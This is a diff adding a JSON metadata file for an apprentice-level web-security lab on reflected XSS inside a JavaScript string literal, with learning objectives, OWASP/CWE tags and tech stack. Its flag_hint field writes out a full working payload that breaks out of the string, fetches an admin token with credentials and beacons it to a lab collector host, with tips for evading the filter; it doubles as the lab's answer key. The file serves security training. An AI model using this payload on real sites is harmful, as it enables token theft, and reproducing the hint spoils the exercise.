@@ -1,0 +1,42 @@
+{
+  "$schema": "../../../labctl/src/schemas/meta.schema.json",
+  "schema_version": "1.0.0",
+  "id": "reflected-xss-js-string-break-out",
+  "title": "Reflected XSS in a JavaScript String Literal",
+  "track": "xss",
+  "difficulty": "apprentice",
+  "estimated_minutes": 30,
+  "max_lifetime_minutes": 45,
+  "learning_objectives": [
+    "Recognise a reflected XSS sink where user input lands inside an inline JavaScript string literal, not an HTML element body",
+    "Break out of a single-quoted JS string with a quote and comment out the trailing source with //",
+    "Explain why an HTML-only filter (angle-bracket stripping) is the wrong encoder for a JavaScript-string context and provides no protection there",
+    "Escalate injected JavaScript into a same-origin credentialed fetch that reads an admin-only token and beacons it out-of-band",
+    "Identify context-aware output encoding (JS-string escaping / JSON-encoding) as the correct fix versus a naive character blacklist"
+  ],
+  "owasp_categories": ["A03:2021-Injection"],
+  "cwe_ids": ["CWE-79"],
+  "prerequisites": ["reflected-xss-search-noescape"],
+  "flag_hint": "Put ';fetch('/api/whoami',{credentials:'include'}).then(function(r){return r.text()}).then(function(t){new Image().src='http://collector:9000/report?w='+encodeURIComponent(t)});// in ?promo (URL-encoded) and submit that path to POST /report. Arrows won't work — the filter strips every > (including the one in =>), so use function(){} expressions. The admin bot runs it; its whoami token beacons to the collector. Read GET /oob/received, then POST /solve {\"c\":\"<32 hex>\"}.",
+  "tech_stack": [
+    "Python 3.12",
+    "Flask 3.1",
+    "gunicorn 23",
+    "vanilla JS (reflected into an inline JS-string literal)",
+    "@websec-lab/xss-verifier headless-Chromium bot",
+    "stdlib OOB collector"
+  ],
+  "tags": [
+    "xss",
+    "reflected-xss",
+    "js-string-breakout",
+    "context-encoding",
+    "oob-exfil",
+    "victim-bot",
+    "cwe-79"
+  ],
+  "risk": "low",
+  "authors": ["furkanalp41"],
+  "exposed_service": { "container_port": 8080, "protocol": "http", "http_path": "/" },
+  "inspired_by": "The canonical PortSwigger 'Reflected XSS into a JavaScript string with angle brackets HTML-encoded' lab pattern, abstracted for local Docker with a Playwright victim bot and an OOB collector"
+}
